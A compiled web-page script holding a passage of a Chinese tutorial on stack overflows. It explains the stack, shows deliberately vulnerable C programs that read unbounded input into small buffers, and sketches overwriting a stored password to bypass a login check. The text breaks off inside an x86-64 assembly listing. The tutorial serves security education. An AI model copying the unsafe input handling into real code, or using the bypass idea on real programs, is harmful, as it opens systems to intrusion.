import{_ as s,o as n,c as a,U as p}from"./chunks/framework.489e5108.js";const b=JSON.parse('{"title":"漏洞挖掘、漏洞利用","description":"","frontmatter":{},"headers":[],"relativePath":"6.计算机安全/6.2.3漏洞挖掘、漏洞利用.md","filePath":"6.计算机安全/6.2.3漏洞挖掘、漏洞利用.md","lastUpdated":1696176798000}'),l={name:"6.计算机安全/6.2.3漏洞挖掘、漏洞利用.md"},o=p(`<h1 id="漏洞挖掘、漏洞利用" tabindex="-1">漏洞挖掘、漏洞利用 <a class="header-anchor" href="#漏洞挖掘、漏洞利用" aria-label="Permalink to &quot;漏洞挖掘、漏洞利用&quot;">​</a></h1><h2 id="常见二进制安全漏洞" tabindex="-1">常见二进制安全漏洞 <a class="header-anchor" href="#常见二进制安全漏洞" aria-label="Permalink to &quot;常见二进制安全漏洞&quot;">​</a></h2><h3 id="栈溢出" tabindex="-1">栈溢出 <a class="header-anchor" href="#栈溢出" aria-label="Permalink to &quot;栈溢出&quot;">​</a></h3><h4 id="栈介绍" tabindex="-1">栈介绍 <a class="header-anchor" href="#栈介绍" aria-label="Permalink to &quot;栈介绍&quot;">​</a></h4><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="https://cdn.xyxsw.site/stack.png" alt=""></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了栈这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p><h4 id="栈溢出基本原理" tabindex="-1">栈溢出基本原理 <a class="header-anchor" href="#栈溢出基本原理" aria-label="Permalink to &quot;栈溢出基本原理&quot;">​</a></h4><p>以最基本的 C 语言为例，C 语言的函数局部变量就保存在栈中。</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">#include</span><span style="color:#9ECBFF;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">()</span></span>
<span class="line"><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">ch</span><span style="color:#E1E4E8;">[</span><span style="color:#79B8FF;">8</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">{</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">};</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">ch2</span><span style="color:#E1E4E8;">[</span><span style="color:#79B8FF;">8</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">{</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">};</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;ch: </span><span style="color:#79B8FF;">%p</span><span style="color:#9ECBFF;">, ch2: </span><span style="color:#79B8FF;">%p</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,ch,ch2);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">#include</span><span style="color:#032F62;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">()</span></span>
<span class="line"><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">char</span><span style="color:#24292E;"> </span><span style="color:#E36209;">ch</span><span style="color:#24292E;">[</span><span style="color:#005CC5;">8</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">{</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">};</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">char</span><span style="color:#24292E;"> </span><span style="color:#E36209;">ch2</span><span style="color:#24292E;">[</span><span style="color:#005CC5;">8</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">{</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">};</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;ch: </span><span style="color:#005CC5;">%p</span><span style="color:#032F62;">, ch2: </span><span style="color:#005CC5;">%p</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,ch,ch2);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>对于如上程序，运行后可以发现 <code>ch</code> 和 <code>a</code> 的地址相差不大 ( <code>a</code> 和 <code>ch</code> 的顺序不一定固定为 <code>a</code> 在前 <code>ch</code> 在后)：</p><p><img src="https://cdn.xyxsw.site/out1.PNG" alt=""></p><p>可以发现 <code>ch</code> 和 <code>ch2</code> 刚好差 <code>8</code> 个字节，也就是 <code>ch</code> 的长度。 <code>ch</code> 只有 <code>8</code> 个字节，那么如果我们向 <code>ch</code> 中写入超过 <code>8</code> 个字节的数据呢？很显然，会从 <code>ch</code> 处发生溢出，写入到 <code>ch2</code> 的空间中，覆盖 <code>ch2</code> 的内容。</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">#include</span><span style="color:#9ECBFF;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">()</span></span>
<span class="line"><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">ch</span><span style="color:#E1E4E8;">[</span><span style="color:#79B8FF;">8</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">{</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">};</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">ch2</span><span style="color:#E1E4E8;">[</span><span style="color:#79B8FF;">8</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">{</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">};</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">scanf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">%s</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,ch);</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;ch: </span><span style="color:#79B8FF;">%s</span><span style="color:#9ECBFF;">, ch2: </span><span style="color:#79B8FF;">%s</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,ch,ch2);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">#include</span><span style="color:#032F62;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">()</span></span>
<span class="line"><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">char</span><span style="color:#24292E;"> </span><span style="color:#E36209;">ch</span><span style="color:#24292E;">[</span><span style="color:#005CC5;">8</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">{</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">};</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">char</span><span style="color:#24292E;"> </span><span style="color:#E36209;">ch2</span><span style="color:#24292E;">[</span><span style="color:#005CC5;">8</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">{</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">};</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">scanf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">%s</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,ch);</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;ch: </span><span style="color:#005CC5;">%s</span><span style="color:#032F62;">, ch2: </span><span style="color:#005CC5;">%s</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,ch,ch2);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><img src="https://cdn.xyxsw.site/out2.PNG" alt=""></p><p>这就是栈溢出的基本原理。</p><h4 id="栈溢出的基本利用" tabindex="-1">栈溢出的基本利用 <a class="header-anchor" href="#栈溢出的基本利用" aria-label="Permalink to &quot;栈溢出的基本利用&quot;">​</a></h4><h5 id="_0x0" tabindex="-1">0x0 <a class="header-anchor" href="#_0x0" aria-label="Permalink to &quot;0x0&quot;">​</a></h5><p>对于以上程序，“栈溢出” 带来的后果仅仅是修改了局部变量的值，会造成一些程序的逻辑错误：</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">#include</span><span style="color:#9ECBFF;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">()</span></span>
<span class="line"><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">input</span><span style="color:#E1E4E8;">[</span><span style="color:#79B8FF;">20</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> password</span><span style="color:#F97583;">[]=</span><span style="color:#9ECBFF;">&quot;vidar-team&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">scanf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">%s</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,input);</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">!</span><span style="color:#B392F0;">strcmp</span><span style="color:#E1E4E8;">(password,input))</span></span>
<span class="line"><span style="color:#E1E4E8;">    {</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;login success!&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">else</span></span>
<span class="line"><span style="color:#E1E4E8;">    {</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;password is wrong!&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">#include</span><span style="color:#032F62;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">()</span></span>
<span class="line"><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">char</span><span style="color:#24292E;"> </span><span style="color:#E36209;">input</span><span style="color:#24292E;">[</span><span style="color:#005CC5;">20</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">char</span><span style="color:#24292E;"> password</span><span style="color:#D73A49;">[]=</span><span style="color:#032F62;">&quot;vidar-team&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">scanf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">%s</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,input);</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">!</span><span style="color:#6F42C1;">strcmp</span><span style="color:#24292E;">(password,input))</span></span>
<span class="line"><span style="color:#24292E;">    {</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;login success!&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">else</span></span>
<span class="line"><span style="color:#24292E;">    {</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;password is wrong!&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>如上代码所示，如果我们想办法通过向 input 中输入过长的字符串覆盖掉 password 的内容，我们就可以实现任意 password “登录”。</p><p>那么能不能有一些更劲爆的手段呢？</p><blockquote><p>以下内容涉及 x86 汇编语言知识</p></blockquote><p>在 C 语言编译之后，通常会产生汇编语言，汇编语言的字节码可以直接在物理 CPU 上运行。而 C 语言函数调用会被编译为如下形式：</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">#include</span><span style="color:#9ECBFF;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">add</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">a</span><span style="color:#E1E4E8;">,</span><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">b</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> a</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">b;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">()</span></span>
<span class="line"><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">int</span><span style="color:#E1E4E8;"> a,b;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">scanf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">%d</span><span style="color:#9ECBFF;"> </span><span style="color:#79B8FF;">%d</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,</span><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">a,</span><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">b);</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">%d</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,</span><span style="color:#B392F0;">add</span><span style="color:#E1E4E8;">(a,b));</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">#include</span><span style="color:#032F62;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">add</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#E36209;">a</span><span style="color:#24292E;">,</span><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#E36209;">b</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> a</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">b;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">int</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">()</span></span>
<span class="line"><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">int</span><span style="color:#24292E;"> a,b;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">scanf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">%d</span><span style="color:#032F62;"> </span><span style="color:#005CC5;">%d</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,</span><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">a,</span><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">b);</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">%d</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,</span><span style="color:#6F42C1;">add</span><span style="color:#24292E;">(a,b));</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><div class="language-asm vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">asm</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">add</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#F97583;">endbr64</span></span>
<span class="line"><span style="color:#F97583;">push</span><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">rbp</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">rsp</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_4], </span><span style="color:#79B8FF;">edi</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_8], </span><span style="color:#79B8FF;">esi</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">edx</span><span style="color:#E1E4E8;">, [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_4]</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_8]</span></span>
<span class="line"><span style="color:#F97583;">add</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">edx</span></span>
<span class="line"><span style="color:#F97583;">pop</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rbp</span></span>
<span class="line"><span style="color:#F97583;">retn</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0;">main:</span></span>
<span class="line"><span style="color:#F97583;">endbr64</span></span>
<span class="line"><span style="color:#F97583;">push</span><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">rbp</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">rsp</span></span>
<span class="line"><span style="color:#F97583;">sub</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rsp</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">10h</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rax</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">fs</span><span style="color:#E1E4E8;">:</span><span style="color:#79B8FF;">28h</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_8], </span><span style="color:#79B8FF;">rax</span></span>
<span class="line"><span style="color:#F97583;">xor</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">eax</span></span>
<span class="line"><span style="color:#F97583;">lea</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rdx</span><span style="color:#E1E4E8;">, [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_C]</span></span>
<span class="line"><span style="color:#F97583;">lea</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rax</span><span style="color:#E1E4E8;">, [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_10]</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rsi</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">rax</span></span>
<span class="line"><span style="color:#F97583;">lea</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rax</span><span style="color:#E1E4E8;">, format     </span><span style="color:#6A737D;">; &quot;%d %d&quot;</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rdi</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">rax</span><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">; format</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">0</span></span>
<span class="line"><span style="color:#F97583;">call</span><span style="color:#E1E4E8;">    _scanf</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">edx</span><span style="color:#E1E4E8;">, [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_C]</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, [</span><span style="color:#79B8FF;">rbp</span><span style="color:#E1E4E8;">+var_10]</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">esi</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">edx</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">edi</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">eax</span></span>
<span class="line"><span style="color:#F97583;">call</span><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">add</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">esi</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">eax</span></span>
<span class="line"><span style="color:#F97583;">lea</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rax</span><span style="color:#E1E4E8;">, aD         </span><span style="color:#6A737D;">; &quot;%d&quot;</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">rdi</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">rax</span><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">; format</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">0</span></span>
<span class="line"><span style="color:#F97583;">call</span><span style="color:#E1E4E8;">    _printf</span></span>
<span class="line"><span style="color:#F97583;">mov</span><span style="color:#E1E4E8;">     </span><span style="color:#79B8FF;">eax</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">0</span></span>
<span class="line"><span style="color:#F97583;">leave</span></span>
<span class="line"><span style="color:#F97583;">retn</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">add</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#D73A49;">endbr64</span></span>
<span class="line"><span style="color:#D73A49;">push</span><span style="color:#24292E;">    </span><span style="color:#005CC5;">rbp</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">rsp</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_4], </span><span style="color:#005CC5;">edi</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_8], </span><span style="color:#005CC5;">esi</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">edx</span><span style="color:#24292E;">, [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_4]</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_8]</span></span>
<span class="line"><span style="color:#D73A49;">add</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">edx</span></span>
<span class="line"><span style="color:#D73A49;">pop</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rbp</span></span>
<span class="line"><span style="color:#D73A49;">retn</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6F42C1;">main:</span></span>
<span class="line"><span style="color:#D73A49;">endbr64</span></span>
